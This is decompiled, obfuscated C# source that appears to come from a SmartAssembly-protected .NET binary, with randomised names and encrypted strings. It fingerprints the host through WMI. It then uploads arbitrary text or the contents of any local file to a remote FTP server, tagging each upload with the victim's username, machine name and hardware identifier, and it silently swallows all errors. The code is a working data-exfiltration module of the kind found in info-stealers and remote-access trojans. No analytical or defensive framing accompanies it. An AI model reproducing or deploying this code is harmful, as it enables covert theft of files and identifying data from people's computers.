using System;
using System.IO;
using System.Management;
using System.Net;
using System.Text;
using SmartAssembly.Delegates;
using SmartAssembly.HouseOfCards;

namespace drXPuaQNZPOSPCS;

internal sealed class CymodjHxdipp
{
	[NonSerialized]
	internal static GetString getString_0;

	public static string DceQYKwRdb()
	{
		//IL_0015: Unknown result type (might be due to invalid IL or missing references)
		//IL_001b: Expected O, but got Unknown
		//IL_003a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0040: Expected O, but got Unknown
		//IL_00a9: Unknown result type (might be due to invalid IL or missing references)
		//IL_00b0: Expected O, but got Unknown
		string text = string.Empty;
		try
		{
			ManagementClass val = new ManagementClass(getString_0(107402691));
			ManagementObjectCollection instances = val.GetInstances();
			ManagementObjectEnumerator enumerator = instances.GetEnumerator();
			try
			{
				if (enumerator.MoveNext())
				{
					ManagementObject val2 = (ManagementObject)enumerator.get_Current();
					text = ((ManagementBaseObject)val2).get_Properties().get_Item(getString_0(107402702)).get_Value()
						.ToString();
				}
			}
			finally
			{
				((IDisposable)enumerator)?.Dispose();
			}
			string text2 = getString_0(107402653);
			ManagementObject val3 = new ManagementObject(getString_0(107402680) + text2 + getString_0(107402127));
			val3.Get();
			return ((ManagementBaseObject)val3).get_Item(getString_0(107402090)).ToString();
		}
		catch (Exception)
		{
			return string.IsNullOrEmpty(text) ? getString_0(107389736) : text;
		}
	}

	public static void vgLiOZAEUdA(string RaTVDLnpkFAav = "URL", string YaHUfBDRAb = "USERNAME", string bCVeENIMNecEJ = "ACCESO", string imMKwGquDM = "")
	{
		try
		{
			string text = DceQYKwRdb();
			FtpWebRequest ftpWebRequest = (FtpWebRequest)WebRequest.Create(RaTVDLnpkFAav + getString_0(107403437) + Environment.UserName + getString_0(107403904) + Environment.MachineName + getString_0(107403883) + text + getString_0(107403878));
			ftpWebRequest.Method = getString_0(107402097);
			ftpWebRequest.Credentials = new NetworkCredential(YaHUfBDRAb, bCVeENIMNecEJ);
			ASCIIEncoding aSCIIEncoding = new ASCIIEncoding();
			byte[] bytes = aSCIIEncoding.GetBytes(imMKwGquDM);
			ftpWebRequest.ContentLength = bytes.Length;
			using Stream stream = ftpWebRequest.GetRequestStream();
			stream.Write(bytes, 0, bytes.Length);
		}
		catch
		{
		}
	}

	public static void RDxamUeGvIod(string whHJGsIPUFBOU = "URL", string lgzUNjuNljzpcq = "USERNAME", string YTcOBadDLzAGWx = "ACCESO", string aEhBskFSFfdKd = "")
	{
		try
		{
			string text = DceQYKwRdb();
			FtpWebRequest ftpWebRequest = (FtpWebRequest)WebRequest.Create(whHJGsIPUFBOU + getString_0(107403437) + Environment.UserName + getString_0(107403904) + Environment.MachineName + getString_0(107403883) + text + getString_0(107403883) + Path.GetFileName(aEhBskFSFfdKd));
			ftpWebRequest.Method = getString_0(107402097);
			ftpWebRequest.Credentials = new NetworkCredential(lgzUNjuNljzpcq, YTcOBadDLzAGWx);
			byte[] array = File.ReadAllBytes(aEhBskFSFfdKd);
			ftpWebRequest.ContentLength = array.Length;
			using Stream stream = ftpWebRequest.GetRequestStream();
			stream.Write(array, 0, array.Length);
		}
		catch
		{
		}
	}

	static CymodjHxdipp()
	{
		Strings.CreateGetStringDelegate(typeof(CymodjHxdipp));
	}
}
